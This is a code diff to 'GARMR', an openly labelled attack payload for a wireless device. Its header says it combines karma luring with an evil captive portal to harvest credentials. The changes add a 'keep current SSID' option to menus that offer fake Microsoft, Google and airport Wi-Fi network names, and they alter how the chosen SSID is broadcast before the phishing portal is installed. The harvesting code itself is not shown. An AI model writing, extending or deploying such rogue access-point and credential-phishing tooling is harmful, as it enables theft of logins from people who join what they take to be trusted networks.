@@ -2,7 +2,7 @@
 # Title: GARMR - Karma + Evil Portal Combined
 # Description: SKOLL's karma luring + LOKI's credential harvesting in one payload
 # Author: HaleHound
-# Version: 4.7.3
+# Version: 4.7.4
 # Category: user/attack
 #
 # Named after the blood-stained hound that guards the gates of HALE
@@ -1189,7 +1189,7 @@ LOG "┏━┛┏━┃┏━┃┏┏ ┏━┃"
 LOG "┃ ┃┏━┃┏┏┛┃┃┃┏┏┛"
 LOG "━━┛┛ ┛┛ ┛┛┛┛┛ ┛"
 LOG ""
-LOG "       GARMR v4.7.3"
+LOG "       GARMR v4.7.4"
 LOG ""
 
 led_setup
@@ -1287,6 +1287,7 @@ case $portal_choice in
         ACTIVE_SSIDS=("${MICROSOFT_SSIDS[@]}")
         PROMPT "MICROSOFT SSIDs:
 
+0. KEEP CURRENT SSID
 1. Microsoft WiFi
 2. Azure Guest
 3. Office 365 WiFi
@@ -1296,12 +1297,13 @@ case $portal_choice in
 
 Press OK then enter number"
         ssid_max=6
-        ssid_default=1
+        ssid_default=0
         ;;
     2)  # Google
         ACTIVE_SSIDS=("${GOOGLE_SSIDS[@]}")
         PROMPT "GOOGLE SSIDs:
 
+0. KEEP CURRENT SSID
 1. Google WiFi
 2. Google Guest
 3. Google Free WiFi
@@ -1311,12 +1313,13 @@ Press OK then enter number"
 
 Press OK then enter number"
         ssid_max=6
-        ssid_default=1
+        ssid_default=0
         ;;
     3)  # WiFi Captive (generic)
         ACTIVE_SSIDS=("${GENERIC_SSIDS[@]}")
         PROMPT "GENERIC SSIDs:
 
+0. KEEP CURRENT SSID
 1. Free WiFi
 2. Guest
 3. Airport WiFi
@@ -1328,11 +1331,11 @@ Press OK then enter number"
 
 Press OK then enter number"
         ssid_max=8
-        ssid_default=1
+        ssid_default=0
         ;;
 esac
 
-ssid_choice=$(NUMBER_PICKER "SSID (1-$ssid_max)" $ssid_default)
+ssid_choice=$(NUMBER_PICKER "SSID (0-$ssid_max)" $ssid_default)
 case $? in
     $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR)
         ssid_choice=$ssid_default
@@ -1340,11 +1343,19 @@ case $? in
 esac
 
 [ -z "$ssid_choice" ] && ssid_choice=$ssid_default
-[ "$ssid_choice" -lt 1 ] && ssid_choice=1
+[ "$ssid_choice" -lt 0 ] && ssid_choice=0
 [ "$ssid_choice" -gt $ssid_max ] && ssid_choice=$ssid_max
 
-SELECTED_SSID="${ACTIVE_SSIDS[$((ssid_choice - 1))]}"
-LOG "Selected: $SELECTED_SSID"
+# Handle "Keep Current SSID" option
+if [ "$ssid_choice" = "0" ]; then
+    SELECTED_SSID=$(get_current_ssid)
+    SKIP_SSID_CHANGE=1
+    LOG "Keeping current SSID: $SELECTED_SSID"
+else
+    SELECTED_SSID="${ACTIVE_SSIDS[$((ssid_choice - 1))]}"
+    SKIP_SSID_CHANGE=0
+    LOG "Selected: $SELECTED_SSID"
+fi
 
 # === CONFIRM LAUNCH ===
 confirm=$(CONFIRMATION_DIALOG "LAUNCH GARMR?\n\nSSID: $SELECTED_SSID\nPortal: $SELECTED_PORTAL\n\nThis will start the attack.")
@@ -1369,11 +1380,15 @@ LOG "Open AP: OK"
 LOG ""
 LOG "=== SETTING SSID ==="
 led_network
-if ! set_broadcast_ssid "$SELECTED_SSID"; then
-    led_error
-    ERROR_DIALOG "Failed to set SSID!\n\nCheck wireless config."
-    LOG "ERROR: Could not set SSID to $SELECTED_SSID"
-    exit 1
+if [ "$SKIP_SSID_CHANGE" = "1" ]; then
+    LOG "Skipping SSID change (using current: $SELECTED_SSID)"
+else
+    if ! set_broadcast_ssid "$SELECTED_SSID"; then
+        led_error
+        ERROR_DIALOG "Failed to set SSID!\n\nCheck wireless config."
+        LOG "ERROR: Could not set SSID to $SELECTED_SSID"
+        exit 1
+    fi
 fi
 
 # === STEP 2: INSTALL PORTAL (LOKI) ===
